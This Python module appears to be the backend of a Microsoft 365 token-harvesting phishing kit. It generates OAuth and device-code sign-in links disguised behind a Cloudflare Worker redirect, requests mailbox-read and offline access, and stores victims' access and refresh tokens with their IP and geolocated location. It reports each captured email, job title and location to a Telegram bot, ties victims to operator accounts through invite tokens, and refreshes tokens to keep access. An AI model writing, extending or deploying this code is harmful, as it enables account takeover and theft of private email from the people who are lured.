import os
import time
import uuid
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus, unquote

import requests

from db import SessionLocal, init_db
from models import (
    TenantToken,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
)

# =========================
# CONFIG
# =========================
CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"

AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
DEVICE_CODE_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
DEVICE_TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"

GRAPH_ME_URL = (
    "https://graph.microsoft.com/v1.0/me"
    "?$select=id,displayName,mail,userPrincipalName,jobTitle"
)

# ✅ READ-ONLY MODE SCOPES
GRAPH_SCOPES = "User.Read Mail.Read offline_access"

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
CLOUDFLARE_WORKER_BASE_URL = os.environ.get("CLOUDFLARE_WORKER_BASE_URL", "").rstrip("/")

# legacy DB compatibility
DEFAULT_SESSION_ID = "jwt-only"


# =========================
# TELEGRAM
# =========================
def send_telegram_alert(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=20,
        )
    except Exception as e:
        print(f"Telegram alert failed: {e}")


# =========================
# DB HELPERS
# =========================
def save_token(user_id, token_data, device_info=None):
    init_db()
    db = SessionLocal()

    try:
        expires_at = int(
            (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
        )

        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()

        if existing:
            existing.access_token = token_data["access_token"]
            existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
            existing.expires_at = expires_at

            if hasattr(existing, "session_id") and not existing.session_id:
                existing.session_id = DEFAULT_SESSION_ID

            if device_info:
                existing.ip_address = device_info.get("ip")
                existing.user_agent = device_info.get("agent")
                existing.location = device_info.get("location")
        else:
            row = TenantToken(
                tenant_id=user_id,
                access_token=token_data["access_token"],
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                ip_address=device_info.get("ip") if device_info else None,
                user_agent=device_info.get("agent") if device_info else None,
                location=device_info.get("location") if device_info else None,
            )

            if hasattr(row, "session_id"):
                row.session_id = DEFAULT_SESSION_ID

            db.add(row)

        db.commit()
    finally:
        db.close()


def get_token(user_id):
    init_db()
    db = SessionLocal()
    try:
        return db.query(TenantToken).filter_by(tenant_id=user_id).first()
    finally:
        db.close()


def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id,
            )
            .first()
        )

        if not existing:
            row = SavedUser(
                admin_user_id=admin_user_id,
                user_id=target_user_id,
            )
            if hasattr(row, "job_title"):
                row.job_title = job_title
            db.add(row)
        else:
            if hasattr(existing, "job_title") and job_title:
                existing.job_title = job_title

        db.commit()
    finally:
        db.close()


def save_or_update_tenant_consent(
    admin_user_id: str,
    tenant_hint: str,
    admin_consent_url: str | None = None,
    status: TenantConsentStatus = TenantConsentStatus.PENDING,
    notes: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        row = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.tenant_hint == tenant_hint,
            )
            .first()
        )

        now_ts = int(time.time())

        if not row:
            row = TenantConsent(
                admin_user_id=admin_user_id,
                tenant_hint=tenant_hint,
                admin_consent_url=admin_consent_url,
                status=status,
                notes=notes,
                created_at=now_ts,
                updated_at=now_ts,
            )
            db.add(row)
        else:
            if admin_consent_url:
                row.admin_consent_url = admin_consent_url
            if status:
                row.status = status
            if notes is not None:
                row.notes = notes
            row.updated_at = now_ts

        db.commit()
    finally:
        db.close()


def create_connect_invite(admin_user_id: str):
    init_db()
    db = SessionLocal()

    try:
        invite_token = f"{uuid.uuid4().int % 10**7}-{uuid.uuid4().int % 10**12}-{uuid.uuid4().hex[:10]}"

        row = ConnectInvite(
            admin_user_id=admin_user_id,
            invite_token=invite_token,
            is_used=False,
        )
        db.add(row)
        db.commit()

        return invite_token
    finally:
        db.close()


def get_connect_invite(invite_token: str):
    init_db()
    db = SessionLocal()

    try:
        return db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()
    finally:
        db.close()


def mark_connect_invite_used(
    invite_token: str,
    resolved_user_id: str | None = None,
    job_title: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        invite = db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()

        if invite:
            invite.is_used = True
            invite.used_at = int(datetime.utcnow().timestamp())
            if resolved_user_id:
                invite.resolved_user_id = resolved_user_id
            if hasattr(invite, "job_title") and job_title:
                invite.job_title = job_title
            db.commit()
    finally:
        db.close()


# =========================
# HELPERS
# =========================
def wrap_with_cloudflare_worker(target_url: str, link_token: str | None = None):
    if not CLOUDFLARE_WORKER_BASE_URL:
        return target_url

    safe_token = link_token or str(uuid.uuid4())
    return f"{CLOUDFLARE_WORKER_BASE_URL}/{safe_token}?{urlencode({'target': target_url})}"


def build_authorize_url(state_value: str, link_token: str | None = None):
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": GRAPH_SCOPES,
        "state": quote_plus(state_value),
        "prompt": "select_account",
    }

    raw_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
    return wrap_with_cloudflare_worker(raw_url, link_token=link_token)


def generate_login_link(user_id: str):
    state_value = f"user:{user_id}"
    return build_authorize_url(state_value, link_token=str(uuid.uuid4()))


def generate_org_connect_link(admin_user_id: str):
    invite_token = create_connect_invite(admin_user_id)
    state_value = f"invite:{invite_token}"
    return build_authorize_url(state_value, link_token=invite_token)


def generate_admin_consent_url(tenant: str | None = None):
    tenant_value = tenant or ADMIN_CONSENT_TENANT
    return f"https://login.microsoftonline.com/{tenant_value}/adminconsent?client_id={CLIENT_ID}"


def build_device_info(client_ip: str = None, user_agent: str = None):
    location_str = "unknown"

    if client_ip:
        try:
            resp = requests.get(f"https://ipinfo.io/{client_ip}/json", timeout=10)
            if resp.ok:
                loc = resp.json()
                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
        except Exception:
            pass

    return {
        "ip": client_ip,
        "agent": user_agent,
        "location": location_str,
    }


def fetch_graph_identity(access_token: str):
    headers = {"Authorization": f"Bearer {access_token}"}
    res = requests.get(GRAPH_ME_URL, headers=headers, timeout=30)
    data = res.json() if res.content else {}

    resolved_user_id = (
        data.get("userPrincipalName")
        or data.get("mail")
        or data.get("id")
    )

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": data.get("jobTitle"),
        "profile": data,
    }


# =========================
# OAUTH CODE FLOW
# =========================
def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
    init_db()

    decoded_state = unquote(state)

    token_payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "scope": GRAPH_SCOPES,
    }

    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token exchange failed: {result.get('error_description', result['error'])}")

    access_token = result["access_token"]
    identity = fetch_graph_identity(access_token)
    resolved_user_id = identity["resolved_user_id"]
    job_title = identity["job_title"]
    profile = identity["profile"]

    if not resolved_user_id:
        raise Exception("Could not resolve Microsoft user identity from /me")

    device_info = build_device_info(client_ip, user_agent)
    save_token(resolved_user_id, result, device_info)

    admin_user_id_for_saved_user = None

    if decoded_state.startswith("user:"):
        admin_user_id_for_saved_user = decoded_state.split("user:", 1)[1]

    elif decoded_state.startswith("invite:"):
        invite_token = decoded_state.split("invite:", 1)[1]
        invite = get_connect_invite(invite_token)

        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            mark_connect_invite_used(invite_token, resolved_user_id, job_title)

    else:
        admin_user_id_for_saved_user = decoded_state

    if admin_user_id_for_saved_user:
        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)

    email = profile.get("userPrincipalName") or profile.get("mail") or "unknown"

    send_telegram_alert(
        f"Resolved User ID: {resolved_user_id}\n"
        f"Job Title: {job_title or 'unknown'}\n"
        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {device_info.get('location', 'unknown')}\n"
        f"Flow: oauth_redirect"
    )

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": job_title,
        "profile": profile,
        "admin_user_id": admin_user_id_for_saved_user,
    }


# =========================
# DEVICE CODE FLOW
# =========================
def start_device_code_flow():
    payload = {
        "client_id": CLIENT_ID,
        "scope": GRAPH_SCOPES,
    }

    res = requests.post(
        DEVICE_CODE_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code >= 400 or "error" in data:
        error_message = data.get("error_description") or data.get("error") or res.text
        raise Exception(f"Device code start failed: {error_message}")

    return {
        "device_code": data["device_code"],
        "user_code": data["user_code"],
        "verification_uri": data["verification_uri"],
        "message": data["message"],
        "expires_in": data["expires_in"],
        "interval": data["interval"],
    }


def poll_device_code_flow(
    device_code: str,
    admin_user_id: str | None = None,
    client_ip: str = None,
    user_agent: str = None,
):
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code,
    }

    res = requests.post(
        DEVICE_TOKEN_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code == 200 and "access_token" in data:
        identity = fetch_graph_identity(data["access_token"])
        resolved_user_id = identity["resolved_user_id"]
        job_title = identity["job_title"]
        profile = identity["profile"]

        if not resolved_user_id:
            raise Exception("Could not resolve Microsoft user identity from /me")

        device_info = build_device_info(client_ip, user_agent)
        save_token(resolved_user_id, data, device_info)

        if admin_user_id:
            save_saved_user(admin_user_id, resolved_user_id, job_title)

        email = profile.get("userPrincipalName") or profile.get("mail") or "unknown"

        send_telegram_alert(
            f"Resolved User ID: {resolved_user_id}\n"
            f"Job Title: {job_title or 'unknown'}\n"
            f"Admin/User Context: {admin_user_id or 'unknown'}\n"
            f"Email: {email}\n"
            f"IP: {client_ip or 'unknown'}\n"
            f"Location: {device_info.get('location', 'unknown')}\n"
            f"Flow: device_code"
        )

        return {
            "status": "complete",
            "resolved_user_id": resolved_user_id,
            "job_title": job_title,
            "profile": profile,
        }

    error_code = data.get("error")
    error_description = data.get("error_description", "")

    if error_code == "authorization_pending":
        return {
            "status": "pending",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "authorization_declined":
        return {
            "status": "declined",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "expired_token":
        return {
            "status": "expired",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "bad_verification_code":
        return {
            "status": "error",
            "error": error_code,
            "detail": error_description,
        }

    return {
        "status": "error",
        "error": error_code or "unknown_error",
        "detail": error_description or res.text,
    }


# =========================
# TOKEN REFRESH
# =========================
def refresh_token(user_id: str):
    token_record = get_token(user_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "scope": GRAPH_SCOPES,
    }

    response = requests.post(TOKEN_URL, data=data, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token refresh failed: {result.get('error_description', result['error'])}")

    save_token(user_id, result)
    return result